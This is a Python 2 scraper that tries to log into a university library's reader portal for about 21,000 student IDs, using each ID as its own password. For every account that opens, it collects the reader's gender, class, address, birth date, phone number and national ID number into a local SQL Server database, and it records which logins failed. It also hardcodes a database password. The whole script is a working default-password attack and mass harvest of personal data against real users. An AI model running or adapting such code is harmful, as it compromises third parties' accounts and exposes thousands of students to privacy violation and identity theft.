#!/usr/bin/python  
# -*- coding: cp936 -*- 
import HTMLParser  
import urlparse  
import urllib  
import urllib2  
import cookielib  
import string  
import re
import pymssql
import sys
stdout = sys.stdout  
reload(sys) 
sys.setdefaultencoding('utf-8')  #���Unicode��������
sys.stdout = stdout             #�������sys ��print�޷����
  
login_url = 'http://202.112.134.140:8080/reader/lib_auth.php' 
post_url = 'http://202.112.134.140:8080/reader/redr_info.php'
  
headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1',  
           'Referer' : 'http://buaalib.com/'
            }
'''postData = {'userid' : 'ZY1421133',  
            'password' : 'ZY1421133', 
            }'''

global postData
global conn,cur
conn=pymssql.connect(host=".",user="sa",password="0792",database="pyspider")
#�����α�����൱��ADO�ļ�¼��
cur=conn.cursor()
global userID
def getuser():
   global userID
   #sql="select stuID from buaauser_select where stuID ='ZY1421133'"
   sql="select stuID from buaauser_select"
   cur.execute(sql)
        #ȡ�����м�¼�����ص���һ������tuple��list��list��Ԫ���Ǽ�¼�У�tuple��Ԫ����ÿ�м�¼���ֶ�
        #ֻ��ִ����������������Ĳ���������Ч������쳣��������ʵ��pymssql���������
   userID=cur.fetchall()
      #print cur.fetchall()[3][0]
   #print cur.fetchone()[0]
   #for stuID in cur.fetchall():
      #print str(stuID[0]).decode('utf-8')#����(u'\u6210\u6881        ',),��stuID[0]�Ϳ�����������
   conn.commit()
        #�ر����ݿ������
   conn.close()
 



def getcookie(login_url,postData):
  cj = cookielib.LWPCookieJar("cookie.txt")  
  cookie_support = urllib2.HTTPCookieProcessor(cj)  
  opener = urllib2.build_opener(cookie_support)

  postData = urllib.urlencode(postData)
  request = urllib2.Request(login_url, postData, headers)  
  response = opener.open(request).read()

  if cj:
    cj.save(ignore_discard=True, ignore_expires=True)
    #print "right"
  else:
     print "cookie error"
  
def getinfo(post_url,user):
   cookie = cookielib.LWPCookieJar()
   cookie.load('cookie.txt', ignore_discard=True, ignore_expires=True) 
   req = urllib2.Request(post_url)
  
   opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))

   response = opener.open(req)
   #page=response.read().decode('utf-8')
   page=response.read()
   #print page
   #�����ж��Ƿ񷵻���ȷҳ��
   pattern1 = re.compile(r'<span id="bookcartCount">.*?<font color="blue">(.*?)</font>',re.S)
   result1 = re.findall(pattern1,page)
   id1=91158
   if len(result1[0])>1:
        #print len(result1),result1.group()
        #pattern=re.compile(r'<TR><TD colspan="2">.*?���֤��:</span>(.*?)</TD>.*?"bluetext">������λ��</span>(.*?)</TD>.*?"bluetext">�Ա�</span>(.*?)</TD>.*?"bluetext">סַ��</span>(.*?)</TD>.*?"bluetext">�������ڣ�</span>(.*?)</TD>',re.S) 
        pattern = re.compile(r'<TD.*?class="bluetext">.*?/span>(.*?)</TD>',re.S)
        result = re.findall(pattern,page)
        #print result[2],len(result[15]),result[16],result[17],result[20],result[22],len(result[24]),result[25],str(result[2])
        conn=pymssql.connect(host=".",user="sa",password="0792",database="pyspider")
       #�����α�����൱��ADO�ļ�¼��
        cur=conn.cursor()
        sql1="update buaauser_select set stuGender=%s,stuClass=%s,stuLocal=%s,stuBirth=%s,stuPhone=%s,stuIDNum=%s,LoginMode=%s where stuID=%s"
        cur.execute(sql1,(str(result[20]).decode('utf-8'),str(result[17]).decode('utf-8'),str(result[21]).decode('utf-8'),str(result[25]).decode('utf-8'),str(result[24]).decode('utf-8'),result[16],"N",str(result[2])))
        conn.commit()
        conn.close()
   else:
        print 'ҳ���ʧ��'
        conn=pymssql.connect(host=".",user="sa",password="0792",database="pyspider")
       #�����α�����൱��ADO�ļ�¼��
        cur=conn.cursor()
        sql="update buaauser_select set LoginMode=%s where stuID=%s"
        cur.execute(sql,("Y",user))
        conn.commit()
        conn.close()
i=1     
getuser()
#print len(userID),userID[1][0],userID[3][0]
#print userID[3][0],str(userID[3][0])
#for i range(0,21472):
while i<21472:
    #print str(userID[i][0])#�δ����˿ո�
    postData = {'userid' : str(userID[i][0]).replace(' ',''),  
                'password' : str(userID[i][0]).replace(' ',''), 
                }
    #print postData
    getcookie(login_url,postData)
    getinfo(post_url,str(userID[i][0]).replace(' ',''))
    i+=1
    print i
print "finnish"
'''postData1 = {'userid' : str(userID[1][0]).replace(' ',''),  
                'password' : str(userID[1][0]).replace(' ',''), 
                }
print postData1,len(str(userID[1][0]))
getcookie(login_url,postData)
print postData'''
#getinfo(post_url)
